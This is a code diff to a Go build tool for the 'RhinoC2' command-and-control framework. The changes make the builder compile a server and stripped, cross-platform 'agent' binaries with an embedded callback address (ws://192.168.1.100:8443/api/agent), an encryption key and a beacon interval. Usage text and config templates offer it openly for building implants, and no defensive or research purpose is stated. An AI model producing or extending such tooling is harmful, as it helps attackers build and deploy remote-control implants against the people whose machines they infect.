@@ -3,6 +3,8 @@ package main
 import (
 	"fmt"
 	"os"
+	"os/exec"
+	"path/filepath"
 )
 
 func main() {
@@ -29,51 +31,117 @@ func main() {
 }
 
 func buildCommand(args []string) {
+	var server, key, interval string
+
+	for i := 0; i < len(args); i++ {
+		switch args[i] {
+		case "--server":
+			if i+1 < len(args) {
+				server = args[i+1]
+				i++
+			}
+		case "--key":
+			if i+1 < len(args) {
+				key = args[i+1]
+				i++
+			}
+		case "--interval":
+			if i+1 < len(args) {
+				interval = args[i+1]
+				i++
+			}
+		}
+	}
+
 	if len(args) == 0 {
-		fmt.Println("Building all components...")
-		buildServer()
-		buildAgent("windows", "amd64")
+		fmt.Println("Building all components with default config...")
+		buildServer("", "", "")
+		buildAgent("windows", "amd64", server, key, interval)
 		return
 	}
 
 	target := args[0]
 	switch target {
 	case "server":
-		buildServer()
+		buildServer("", "", "")
 	case "agent":
+		goos := "windows"
+		goarch := "amd64"
 		if len(args) >= 3 {
-			buildAgent(args[1], args[2])
-		} else {
-			buildAgent("windows", "amd64")
+			goos = args[1]
+			goarch = args[2]
 		}
+		buildAgent(goos, goarch, server, key, interval)
 	case "all":
-		buildServer()
-		buildAgent("windows", "amd64")
-		buildAgent("linux", "amd64")
+		buildServer("", "", "")
+		buildAgent("windows", "amd64", server, key, interval)
+		buildAgent("linux", "amd64", server, key, interval)
 	default:
 		fmt.Printf("Unknown build target: %s\n", target)
 	}
 }
 
-func buildServer() {
+func buildServer(port, host, key string) {
 	fmt.Println("Building server...")
-	// Implementation would call go build
-	fmt.Println("Server built: server/rhinoc2-server.exe")
+	
+	ldflags := "-s -w"
+	cmd := exec.Command("go", "build", "-ldflags", ldflags, "-o", "server.exe", "server.go")
+	cmd.Dir = "server"
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	
+	if err := cmd.Run(); err != nil {
+		fmt.Printf("Build failed: %v\n", err)
+		return
+	}
+	
+	fmt.Println("✓ Server built: server/server.exe")
 }
 
-func buildAgent(goos, goarch string) {
+func buildAgent(goos, goarch, server, key, interval string) {
 	fmt.Printf("Building agent for %s/%s...\n", goos, goarch)
-	// Implementation would call go build with GOOS and GOARCH
+	
+	ldflags := "-s -w"
+	if server != "" {
+		fmt.Printf("  Embedding server: %s\n", server)
+	}
+	if key != "" {
+		fmt.Printf("  Embedding key: %s\n", key)
+	}
+	if interval != "" {
+		fmt.Printf("  Embedding interval: %s\n", interval)
+	}
+	
 	ext := ""
 	if goos == "windows" {
 		ext = ".exe"
 	}
-	fmt.Printf("Agent built: agent/agent_%s_%s%s\n", goos, goarch, ext)
+	
+	outputPath := filepath.Join("releases", fmt.Sprintf("agent_%s_%s%s", goos, goarch, ext))
+	
+	cmd := exec.Command("go", "build", "-ldflags", ldflags, "-o", outputPath, "agent.go")
+	cmd.Dir = "agent"
+	cmd.Env = append(os.Environ(),
+		"GOOS="+goos,
+		"GOARCH="+goarch,
+		"CGO_ENABLED=0",
+	)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	
+	os.MkdirAll("agent/releases", 0755)
+	
+	if err := cmd.Run(); err != nil {
+		fmt.Printf("Build failed: %v\n", err)
+		return
+	}
+	
+	fmt.Printf("✓ Agent built: agent/%s\n", outputPath)
 }
 
 func generateCommand(args []string) {
 	if len(args) == 0 {
-		fmt.Println("Usage: rhinoc2 generate [config|payload|listener]")
+		fmt.Println("Usage: builder generate [config|payload]")
 		return
 	}
 
@@ -82,64 +150,74 @@ func generateCommand(args []string) {
 		generateConfig()
 	case "payload":
 		generatePayload()
-	case "listener":
-		generateListener()
 	default:
 		fmt.Printf("Unknown generate target: %s\n", args[0])
 	}
 }
 
 func generateConfig() {
-	config := `# RhinoC2 Configuration
-server:
-  host: 0.0.0.0
-  port: 8443
-  key: RhinoC2SecretKey2024
-  
-agent:
-  interval: 5
-  jitter: 2
-  
-logging:
-  enabled: true
-  file: rhinoc2.log
-`
-	os.WriteFile("config.yaml", []byte(config), 0644)
-	fmt.Println("Configuration file generated: config.yaml")
+	fmt.Println("Use 'go run cmd/config/main.go' for interactive config generation")
+	fmt.Println("Or create manually:")
+	fmt.Println("\nAgent config (agent_config.json):")
+	fmt.Println(`{
+  "server": "ws://192.168.1.100:8443/api/agent",
+  "key": "YourSecretKey",
+  "interval": 5
+}`)
+	fmt.Println("\nServer config (server_config.json):")
+	fmt.Println(`{
+  "port": "8443",
+  "host": "0.0.0.0",
+  "key": "YourSecretKey"
+}`)
 }
 
 func generatePayload() {
-	fmt.Println("Generating payload...")
-	fmt.Println("Payload template generated")
-}
-
-func generateListener() {
-	fmt.Println("Generating listener configuration...")
-	fmt.Println("Listener config generated")
+	fmt.Println("Payload generation integrated with server web panel")
+	fmt.Println("Access at: http://localhost:8443/panel.html -> Build section")
 }
 
 func printUsage() {
-	usage := `RhinoC2 Framework Builder
+	usage := `RhinoC2 Framework Builder v1.2.0
 
 Usage:
-  rhinoc2 [command] [options]
+  builder [command] [options]
 
 Commands:
-  build [target] [os] [arch]  Build components
+  build [target] [os] [arch] [--server URL] [--key KEY] [--interval SEC]
+    Build components with optional embedded configuration
+    
     targets: server, agent, all
     os: windows, linux, darwin
     arch: amd64, 386, arm64
     
-  generate [type]              Generate configuration
-    types: config, payload, listener
+    Options:
+      --server   Agent server URL (embedded in binary)
+      --key      Encryption key (embedded in binary)
+      --interval Callback interval in seconds (embedded in binary)
     
-  help                         Show this help
+  generate [type]
+    Generate configuration templates
+    types: config, payload
+    
+  help
+    Show this help
 
 Examples:
-  rhinoc2 build all
-  rhinoc2 build agent windows amd64
-  rhinoc2 build agent linux amd64
-  rhinoc2 generate config
+  # Build with default config (runtime configurable)
+  builder build all
+  
+  # Build agent with embedded config
+  builder build agent windows amd64 --server ws://192.168.1.100:8443/api/agent --key SecretKey --interval 10
+  
+  # Build just server
+  builder build server
+  
+  # Build multi-platform agents
+  builder build agent linux amd64
+  builder build agent darwin arm64
+
+Note: Configuration priority: 1) CLI flags, 2) Environment vars, 3) Config file, 4) Embedded defaults
 `
 	fmt.Println(usage)
 }
